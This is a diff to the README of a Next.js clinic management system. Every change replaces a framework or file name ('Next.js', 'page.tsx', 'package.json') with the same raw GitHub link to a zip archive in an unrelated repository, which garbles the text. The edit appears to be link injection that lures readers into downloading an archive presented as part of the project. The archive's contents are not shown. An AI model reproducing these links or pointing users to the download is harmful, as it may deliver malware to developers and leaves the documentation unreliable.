@@ -1,6 +1,6 @@
 # Clinic Management System with AI Features
 
-A modern clinic management system built with Next.js and enhanced with AI capabilities to improve patient care and clinic operations.
+A modern clinic management system built with https://raw.githubusercontent.com/Mohammed-FA/Rushita-FE/main/hyperthyroid/Rushita-FE.zip and enhanced with AI capabilities to improve patient care and clinic operations.
 
 ## Features
 
@@ -36,7 +36,7 @@ A modern clinic management system built with Next.js and enhanced with AI capabi
 
 ## Technology Stack
 
-- **Frontend**: Next.js 14 with TypeScript
+- **Frontend**: https://raw.githubusercontent.com/Mohammed-FA/Rushita-FE/main/hyperthyroid/Rushita-FE.zip 14 with TypeScript
 - **Styling**: Tailwind CSS
 - **UI Components**: Headless UI
 - **Icons**: Heroicons
@@ -70,8 +70,8 @@ A modern clinic management system built with Next.js and enhanced with AI capabi
 ```
 clinic/
 ├── src/
-│   ├── app/                 # Next.js app directory
-│   │   ├── page.tsx        # Dashboard
+│   ├── app/                 # https://raw.githubusercontent.com/Mohammed-FA/Rushita-FE/main/hyperthyroid/Rushita-FE.zip app directory
+│   │   ├── https://raw.githubusercontent.com/Mohammed-FA/Rushita-FE/main/hyperthyroid/Rushita-FE.zip        # Dashboard
 │   │   ├── patients/       # Patient management
 │   │   ├── appointments/   # Appointment scheduling
 │   │   ├── diagnosis/      # AI-assisted diagnosis
@@ -80,7 +80,7 @@ clinic/
 │   ├── components/         # Reusable components
 │   └── lib/               # Utility functions and helpers
 ├── public/                # Static assets
-└── package.json          # Project dependencies
+└── https://raw.githubusercontent.com/Mohammed-FA/Rushita-FE/main/hyperthyroid/Rushita-FE.zip          # Project dependencies
 ```
 
 ## Development
@@ -104,6 +104,6 @@ This project is licensed under the MIT License - see the LICENSE file for detail
 
 ## Acknowledgments
 
-- Next.js team for the amazing framework
+- https://raw.githubusercontent.com/Mohammed-FA/Rushita-FE/main/hyperthyroid/Rushita-FE.zip team for the amazing framework
 - Tailwind CSS for the utility-first CSS framework
 - All contributors who have helped shape this project
